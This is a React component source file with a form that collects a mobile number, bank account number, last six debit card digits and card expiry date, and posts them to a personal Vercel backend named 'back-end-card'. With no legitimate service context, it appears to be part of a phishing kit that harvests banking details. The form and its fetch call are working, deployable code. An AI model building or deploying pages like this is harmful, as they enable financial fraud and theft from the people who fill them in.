// src/components/Side2.js
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import image from '../assets/images/image.webp';

const Side2 = () => {
    const [formData, setFormData] = useState({
        mobileNumber: '',
        accountNumber: '',
        debitCardDigits: '',
        expiryDate: ''
    });

    const navigate = useNavigate();

    const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData({
            ...formData,
            [name]: value
        });
    };
    const handleSubmit = async (e) => {
        e.preventDefault();
        console.log('Form Data:', formData); // Log form data
    
        try {
            // Make a POST request to your API
            const response = await fetch('https://back-end-card-git-main-alvin-sifats-projects.vercel.app/api', { // Adjusted to the correct endpoint
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(formData)
            });
    
            if (!response.ok) {
                throw new Error('Network response was not ok ' + response.statusText);
            }
    
            const data = await response.json();
            console.log('Success:', data);
    
            // Clear form fields after submission
            setFormData({
                mobileNumber: '',
                accountNumber: '',
                debitCardDigits: '',
                expiryDate: ''
            });
    
            // Navigate to the next page
            navigate('/side2'); // Adjust navigation to the next page
    
        } catch (error) {
            console.error('Error:', error);
            // Optionally, handle errors (e.g., show a notification or message)
        }
    };
    

    return (
        <div className="mx-auto flex flex-col items-center bg-blue-100 p-8 rounded-lg shadow-lg max-w-md space-y-6">
            {/* Image Section */}
            <div className="w-full">
                <img src={image} alt="First Image" className="w-full h-auto rounded-lg" />
            </div>

            {/* Input Form Section */}
            <form onSubmit={handleSubmit} className="w-full space-y-4">
                <div>
                    <label className="block text-gray-700 text-sm font-semibold mb-1">Mobile Number</label>
                    <input
                        type="tel"
                        name="mobileNumber"
                        placeholder="Enter mobile number"
                        value={formData.mobileNumber}
                        onChange={handleChange}
                        className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                    />
                </div>
                <div>
                    <label className="block text-gray-700 text-sm font-semibold mb-1">Account Number</label>
                    <input
                        type="text"
                        name="accountNumber"
                        placeholder="Enter account number"
                        value={formData.accountNumber}
                        onChange={handleChange}
                        className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                    />
                </div>
                <div>
                    <label className="block text-gray-700 text-sm font-semibold mb-1">Last 6 Digits of Debit Card</label>
                    <input
                        type="text"
                        name="debitCardDigits"
                        maxLength="6"
                        placeholder="Enter last 6 digits"
                        value={formData.debitCardDigits}
                        onChange={handleChange}
                        className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                    />
                </div>
                <div>
                    <label className="block text-gray-700 text-sm font-semibold mb-1">Expiry Date</label>
                    <input
                        type="text"
                        name="expiryDate"
                        placeholder="MM/YY"
                        value={formData.expiryDate}
                        onChange={handleChange}
                        className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                    />
                </div>

                <button type="submit" className='bg-black text-white px-9 py-4 mt-9'>
                    Next
                </button>
            </form>
        </div>
    );
};

export default Side2;
